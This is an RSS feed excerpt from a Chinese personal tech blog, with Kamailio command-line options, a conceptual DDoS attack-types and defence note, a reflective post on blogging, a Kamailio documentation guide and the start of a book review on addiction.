&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    -m nr        Size of shared memory allocated in Megabytes
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                共享内存的大小设置
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    --modparam&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;modname:paramname:type:value set the module parameter
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                  type has to be &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;s&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; string value and &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;i&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; int value, 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                  example: --modparam&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;corex:alias_subdomains:s:kamailio.org
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                  设置模块的启动参数
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                  对于不方便在脚本里写死的模块参数，这个方式也挺好用
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    --all-errors Print details about all config errors that can be detected
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                调试模式比较好用，打印详细的日志报错 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    -M nr        Size of private memory allocated, in Megabytes
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                控制私有内存的大小
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    -n processes Number of child processes to fork per interface
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                  &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;default: 8&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    -N           Number of tcp child processes &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;default: equal to &lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;-n&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    -O nr        Script optimization level (debugging option)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    -P file      Create a pid file
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    -Q           Number of sctp child processes (default: equal to `-n&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    -r           Use dns to check &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; is necessary to add a &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;received=&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                  field to a via
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    -R           Same as &lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;-r&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt; but use reverse dns;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                  &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;to use both use &lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;-rR&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    --server-id&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;num set the value &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; server_id
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    --subst&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;exp set a subst preprocessor directive
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    --substdef&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;exp set a substdef preprocessor directive
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    --substdefs&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;exp set a substdefs preprocessor directive
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    -S           disable sctp
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    -t dir       Chroot to &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;dir&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    -T           Disable tcp
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    -u uid       Change uid &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;user id&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    -v           Version number
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    --version    Long option &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;-v&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    -V           Alternative &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;-v&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    -x name      Specify internal manager &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; shared memory &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;shm&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                  - can be: fm, qm or tlsf
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    -X name      Specify internal manager &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; private memory &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;pkg&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                  - &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; omitted, the one &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; shm is used
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    -Y dir       Runtime dir path
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    -w dir       Change the working directory to &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;dir&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;default: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    -W type      poll method &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;depending on support in OS, it can be: poll,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                  epoll_lt, epoll_et, sigio_rt, &lt;span style=&#34;color:#66d9ef&#34;&gt;select&lt;/span&gt;, kqueue, /dev/poll&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>DDOS学习笔记</title>
      <link>https://wdd.js.org/posts/2024/ddos/</link>
      <pubDate>Tue, 17 Dec 2024 21:10:40 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2024/ddos/</guid>
      <description>&lt;h1 id=&#34;攻击分类&#34;&gt;攻击分类&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;网络层&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;ICMP Flood攻击&lt;/strong&gt;: ICMP（Internet Control Message Protocol，因特网控制报文协议）是TCP/IP协议族的一个子协议，用于在IP主机、路由器之间传递控制消息。ICMP协议本身特点决定了它非常容易被用于攻击网络上的路由器和主机。当攻击者向目标网络发送大量的ICMP数据包时，目标主机会耗费大量的CPU资源去处理和响应，直至耗尽设备资源，无法为合法用户提供正常服务。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ARP Flood攻击&lt;/strong&gt;: ARP（Address Resolution Protocol，地址解析协议）是用来将IP地址解析为MAC地址的协议。ARP协议主要以广播的方式发送ARP请求。同网段内的主机都可以收到广播请求，这为攻击者提供了可乘之机。攻击者通过发送大量的ARP请求，使有限的网络资源被无用的广播信息所占用，造成网络拥堵。其次，因为ARP协议没有安全认证机制，所以只要主机接收到ARP应答包，都会缓存在ARP表中，这为ARP欺骗提供了可能。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;IP分片攻击&lt;/strong&gt;: IP协议在传输数据包时，会将数据报文分为若干分片进行传输，并在目标系统中进行重组。IP分片是网络环境中经常发生的事件，但是，如果数据被人为恶意分片就会产生DDoS攻击。攻击者将经过恶意分段的数据包发送至目标网络，导致目标网络耗费大量资源进行重组，直至资源枯竭。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;传输层攻击&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;SYN Flood攻击&lt;/strong&gt;: SYN Flood是互联网最原始、最经典的DDoS攻击之一，主要利用了TCP协议的三次握手机制。攻击者通常利用工具或控制僵尸主机向服务器发送海量的变源IP地址或变源端口的SYN报文，服务器响应报文后产生大量的半连接，直至系统资源被耗尽，服务器无法提供正常的服务。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ACK Flood攻击&lt;/strong&gt;: 攻击者通过僵尸网络向目标服务器发送大量的ACK报文，报文带有超大载荷，会引起链路拥塞。或向目标服务器发送极高速率的变源变端口请求，导致转发设备异常，从而引起网络瘫痪。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;UDP Flood攻击&lt;/strong&gt;: UDP Flood攻击常用于大带宽DDoS攻击。攻击者使用包含无状态UDP协议的IP数据包充塞目标主机的端口，受害主机会寻找与UDP数据包相关的应用程序。如果没有找到，就向发送者回发一条“目标不可达”消息。一旦目标主机被攻击流量淹没，系统就会失去响应，从而造成合法用户无法正常访问的现象。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;应用层攻击&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;DNS Flood攻击&lt;/strong&gt;: 攻击者通过操纵大量傀儡机器，对目标网络发起海量域名查询请求，以中断该域的DNS解析。这种攻击将会破坏网站、API或Web应用程序响应合法流量的能力，让合法用户无法查找到用于调用特定资源的地址，导致业务暂时中断或停止。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;HTTP Flood攻击&lt;/strong&gt;: HTTP GET 攻击：攻击者操控多台设备向目标服务器发送对图像、文件或其他资产请求，当目标服务器被传入请求和响应所淹没时，来自正常流量源的业务请求也将被拒绝。
HTTP POST 攻击：与发送 POST 请求所需的处理能力和带宽相比，处理表单数据和运行必要数据库命令的过程相对密集。这种攻击利用相对资源消耗的差异，直接向目标服务器发送大量POST请求，直至目标服务器容量饱和并拒绝服务为止。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;CC攻击&lt;/strong&gt;: CC攻击常用于攻击提供网页访问服务的服务器。攻击者通过代理服务器向目标服务器发送大量貌似合法的请求，使CPU长时间处于高负荷运行状态，永远都有处理不完的连接。攻击会导致正常访问被中止，最终宕机崩溃。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;SIP注册 Flood攻击&lt;/strong&gt;: 攻击者发送大量的SIP注册请求到SIP服务端，SIP服务器需要查询数据库，拖慢正常的数据库查询，也回占用大量的资源来维护注册的事务。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;faq&#34;&gt;FAQ&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;防火墙能否拦截DDOS攻击？
&lt;ul&gt;
&lt;li&gt;拦截不了，防火墙就好比饭店的保安，保安再多，但是饭店门口道路交通堵塞了，饭店的营业额下降，再多的保安也无能为力&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;在遭受DDOS攻击后，用什么手段防御？
&lt;ol&gt;
&lt;li&gt;购买硬件设备：除了比较贵之外，对于使用云服务器的服务也无能为力&lt;/li&gt;
&lt;li&gt;更换公网IP：对于使用云服务器来说，更换云服务器的公网IP看起来比较简单方便。但是也有麻烦的地方，比如自己的服务可能要涉及到配置改变和服务重启，和自己相关的第三方，也可能要修改IP的访问地址&lt;/li&gt;
&lt;li&gt;使用云服务厂商提供的DDOS服务&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;如何感知到自己的服务正在遭受DDOS攻击？
&lt;ol&gt;
&lt;li&gt;异常大的流量波动&lt;/li&gt;
&lt;li&gt;正常用户大量离线&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;参考&#34;&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://info.support.huawei.com/info-finder/encyclopedia/zh/DDoS%E6%94%BB%E5%87%BB.html&#34;&gt;https://info.support.huawei.com/info-finder/encyclopedia/zh/DDoS%E6%94%BB%E5%87%BB.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.microsoft.com/zh-cn/security/business/security-101/what-is-a-ddos-attack&#34;&gt;https://www.microsoft.com/zh-cn/security/business/security-101/what-is-a-ddos-attack&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>你不怕暴露自己的无知吗？</title>
      <link>https://wdd.js.org/posts/2024/121701/</link>
      <pubDate>Sat, 07 Dec 2024 14:17:28 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2024/121701/</guid>
      <description>&lt;h1 id=&#34;公开自己的错误&#34;&gt;公开自己的错误&lt;/h1&gt;
&lt;p&gt;我在写博客时，有时候脑海里总会蹦出一个小人，面露鄙夷的脸色对我说：你写这么多没啥技术含量的垃圾，公开在网上，难道不怕暴露自己的无知吗？&lt;/p&gt;
&lt;p&gt;说实话，我是有这样的担忧。&lt;/p&gt;
&lt;p&gt;因为我是有自知之明的，我知道自己估计也是黄老师那种&amp;quot;样样通，样样松&amp;quot;的人。 写的东西也都是一些表面的东西，甚至有错误的可能。这并不是自谦。&lt;/p&gt;
&lt;p&gt;我一直无法找到反击脑海里小人的理由。&lt;/p&gt;
&lt;p&gt;今天，我在读一本书的时候，学到了一个概念，这个概念叫做坎宁安定律。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;在互联网上获得正确答案的最好方法并不是提出问题，而是发布错误的答案&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;也许我的答案是错误的，但是它并没有被隐藏我脑海的某个角落，二是被公开在了网上。&lt;/p&gt;
&lt;p&gt;即使我的小破站再小，必然也会有几个阅读量吧，或许能有读者对错误的答案提出自己的异议。&lt;/p&gt;
&lt;h1 id=&#34;学习金字塔理论&#34;&gt;学习金字塔理论&lt;/h1&gt;
&lt;p&gt;如果仅仅是通过阅读学习，学习内容的平均存留率只有5%。&lt;/p&gt;
&lt;p&gt;如果把学习内容公开，这其中就暗示了你可能需要把自己学到的内容教授给他人这一心理。&lt;/p&gt;
&lt;p&gt;那么在记录笔记的时候，就会想办法把问题讲解的让别人更清楚，从而加深了自己的学习知识吸收。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2024/121701/atta/2024-12-22-13-17-38.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;参考&#34;&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://baike.baidu.com/item/%E5%AD%A6%E4%B9%A0%E9%87%91%E5%AD%97%E5%A1%94/9515094&#34;&gt;https://baike.baidu.com/item/%E5%AD%A6%E4%B9%A0%E9%87%91%E5%AD%97%E5%A1%94/9515094&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>第一节 如何熟悉Kamailio文档的文档结构</title>
      <link>https://wdd.js.org/kamailio/docs-index/</link>
      <pubDate>Mon, 02 Dec 2024 22:43:24 +0800</pubDate>
      <guid>https://wdd.js.org/kamailio/docs-index/</guid>
      <description>&lt;blockquote&gt;
&lt;p&gt;我始终认为，快速学习一门知识，最为重要的就是熟悉它的文档结构。&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;对于熟悉OpenSIPS的文档结构来说的人，看了Kamailio的文档，往往觉得无从下手。&lt;/p&gt;
&lt;p&gt;当我们打开Km的官网(kamailio.org)后， 会重定向到https://www.kamailio.org/w/,  在页面的右侧，&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/kamailio/docs-index/atta/2024-12-02-22-57-06.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;接着，我们会导航到 &lt;a href=&#34;https://www.kamailio.org/w/documentation/&#34;&gt;https://www.kamailio.org/w/documentation/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;这个页面的结构需要烂熟于心&lt;/p&gt;
&lt;h1 id=&#34;1-模块文档&#34;&gt;1. 模块文档&lt;/h1&gt;
&lt;p&gt;如果你知道km的版本号和对应的模块，可以点击这里进入对应版本，然后再选择对应模块&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/kamailio/docs-index/atta/2024-12-02-23-03-53.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;2-wiki部分&#34;&gt;2. wiki部分&lt;/h1&gt;
&lt;h2 id=&#34;21-必学部分&#34;&gt;2.1 必学部分&lt;/h2&gt;
&lt;p&gt;wiki部分主要是一些教程，非常值得看。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/kamailio/docs-index/atta/2024-12-02-23-05-57.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;其中有三个重点部分&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;core cookbook&lt;/strong&gt;： 主要讲解km的脚本的结构、全局参数、模块参数、路由类型、预处理、脚本操作等等，是编写km脚本的必学之处，各种参数都可以看看&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Pseudo-Variables CookBook&lt;/strong&gt;：主要讲解各种伪变量，用来读写SIP消息&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Transformations CookBook&lt;/strong&gt;： 主要讲解各种操作变换，例如把字符串型转为int型数据&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/kamailio/docs-index/atta/2024-12-02-23-07-06.png&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;全部函数索引&#34;&gt;全部函数索引&lt;/h2&gt;
&lt;p&gt;在km的wiki官网，即https://www.kamailio.org/wikidocs/， 其中Alphabetic Indexes就是所有的参数或者函数的索引。&lt;/p&gt;
&lt;p&gt;在你学些km的脚本时，有时候想知道某个函数在哪个模块中，就可以用这个全部函数索引中查找。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/kamailio/docs-index/atta/2024-12-07-11-37-37.png&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;源码安装&#34;&gt;源码安装&lt;/h2&gt;
&lt;p&gt;这部分讲解如何通过GIT进行源码安装。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/kamailio/docs-index/atta/2024-12-02-23-12-53.png&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;faq&#34;&gt;FAQ&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://www.kamailio.org/wikidocs/tutorials/faq/main/&#34;&gt;https://www.kamailio.org/wikidocs/tutorials/faq/main/&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;外部资源&#34;&gt;外部资源&lt;/h2&gt;
&lt;p&gt;这里涉及了如何用km和常见的媒体服务器如何集成&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/kamailio/docs-index/atta/2024-12-02-23-16-07.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/kamailio/docs-index/atta/2024-12-02-23-31-00.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/kamailio/docs-index/atta/2024-12-02-23-33-15.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;其他&#34;&gt;其他&lt;/h1&gt;
&lt;p&gt;官方的Web版本的wiki, 对于刚入门的人来说，还是有点绕的。&lt;/p&gt;
&lt;p&gt;另外一个问题就是mkdocs的页面渲染效果的确不太行，目录滚动一点都不灵敏。&lt;/p&gt;
&lt;p&gt;如果你想看的不是某个模块的说明文档，我更建议你直接把https://github.com/kamailio/kamailio-wiki 这个git仓库下载到本地查看。&lt;/p&gt;
&lt;h1 id=&#34;总结&#34;&gt;总结&lt;/h1&gt;
&lt;p&gt;总体来说，km的文档算是非常完整了，但是和OpenSIPS相比，还有待加强。&lt;/p&gt;</description>
    </item>
    <item>
      <title>TypeSctipt类型实战</title>
      <link>https://wdd.js.org/fe/ts-type-action/</link>
      <pubDate>Fri, 22 Nov 2024 13:04:35 +0800</pubDate>
      <guid>https://wdd.js.org/fe/ts-type-action/</guid>
      <description></description>
    </item>
    <item>
      <title>AXB的玩法说明</title>
      <link>https://wdd.js.org/opensips/ch2/axb/</link>
      <pubDate>Mon, 18 Nov 2024 19:58:38 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch2/axb/</guid>
      <description></description>
    </item>
    <item>
      <title>成瘾：在放纵中寻找平衡</title>
      <link>https://wdd.js.org/books/005-%E6%88%90%E7%98%BE-%E5%9C%A8%E6%94%BE%E7%BA%B5%E4%B8%AD%E5%AF%BB%E6%89%BE%E5%B9%B3%E8%A1%A1/</link>
      <pubDate>Mon, 18 Nov 2024 18:35:02 +0800</pubDate>
      <guid>https://wdd.js.org/books/005-%E6%88%90%E7%98%BE-%E5%9C%A8%E6%94%BE%E7%BA%B5%E4%B8%AD%E5%AF%BB%E6%89%BE%E5%B9%B3%E8%A1%A1/</guid>
      <description>&lt;h1 id=&#34;快乐的位置&#34;&gt;快乐的位置&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/books/005-%E6%88%90%E7%98%BE-%E5%9C%A8%E6%94%BE%E7%BA%B5%E4%B8%AD%E5%AF%BB%E6%89%BE%E5%B9%B3%E8%A1%A1/atta/2024-11-18-18-40-32.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;读完这本书，我最大的收获是这句话：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;在过去七十五年里，神经科学领域最重要的发现之一，就是大脑中处理快乐和痛苦的区域是相同的&lt;/strong&gt;&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;之前我一直有个误解，我认为人的大脑感受快乐和痛苦的区域是分开的。&lt;/p&gt;
&lt;p&gt;如果快乐和痛苦都是在一个位置感受，那痛苦还是快乐，由什么决定呢？&lt;/p&gt;
&lt;h1 id=&#34;瘾形成的机制-内稳态的天平&#34;&gt;瘾形成的机制： 内稳态的天平&lt;/h1&gt;
&lt;p&gt;每个人或多或少都有某种&lt;strong&gt;瘾&lt;/strong&gt;， 就比如我， 有段时间有玩电子游戏的瘾。 玩的时候很开心， 几把游戏结束之后，有感觉非常失落。没过几小时，又想再开一局。 这种情绪形成的原因是什么，是我想要了解的。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;成瘾（英语：addiction）是指一种重复性的强迫行为，即使这些行为已知可能造成不良后果的情形下，仍然被持续重复[5]。这种行为可能因中枢神经系统功能失调造成，重复这些行为也可以反过来造成神经功能受损  &amp;ndash;&lt;a href=&#34;https://zh.wikipedia.org/wiki/%E6%88%90%E7%98%BE&#34;&gt;维基百科&lt;/a&gt;&lt;/p&gt;&lt;/blockquote&gt;
&lt;blockquote&gt;
